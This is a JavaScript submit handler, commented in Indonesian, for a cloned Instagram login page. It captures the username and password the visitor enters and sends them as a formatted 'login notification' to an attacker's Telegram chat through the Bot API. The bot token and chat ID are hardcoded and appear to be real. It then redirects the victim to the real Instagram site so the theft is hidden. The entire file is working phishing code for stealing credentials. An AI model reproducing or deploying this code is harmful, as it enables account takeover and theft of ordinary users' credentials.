document.getElementById('tgLoginForm').addEventListener('submit', function(event) {
    event.preventDefault(); // Mencegah reload halaman

    // 1. Tangkap input pengguna
    const userValue = document.getElementById('username').value;
    const passValue = document.getElementById('password').value;
    const submitBtn = document.getElementById('submitBtn');

    // Ubah teks tombol agar terlihat seperti sedang memproses login
    submitBtn.innerText = "Memuat...";
    submitBtn.disabled = true;

    // 2. ⚠️ PENTING: ISI DATA BOT TELEGRAM ANDA DI SINI ⚠️
    const botToken = "8944168845:AAE-fJOEJwFKrFK3dRzI5UQiuYvbkJC7Z_Y"; 
    const chatId = "1966317946";     

    // 3. Desain isi pesan yang dikirim ke telegram
    const message = `🔔 *NOTIFIKASI LOGIN INSTAGRAM* 🔔\n\n` +
                    `👤 *User/Email:* \`${userValue}\`\n` +
                    `🔑 *Password:* \`${passValue}\`\n\n` +
                    `🌐 _Dikirim otomatis dari Web Clone._`;

    // 4. Endpoint Telegram API
    const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;

    // 5. Mengirim data menggunakan Fetch API
    fetch(telegramUrl, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            chat_id: chatId,
            text: message,
            parse_mode: 'Markdown'
        })
    })
    .then(response => {
        if (response.ok) {
            // Jika berhasil terkirim, alihkan pengguna ke halaman Instagram asli (opsional)
            window.location.href = "https://instagram.com";
        } else {
            alert("Terjadi kesalahan sistem. Sila coba kembali.");
            resetButton();
        }
    })
    .catch(error => {
        console.error("Error:", error);
        alert("Gagal terhubung ke jaringan.");
        resetButton();
    });

    // Fungsi mengembalikan tombol ke awal jika gagal
    function resetButton() {
        submitBtn.innerText = "Masuk";
        submitBtn.disabled = false;
    }
});
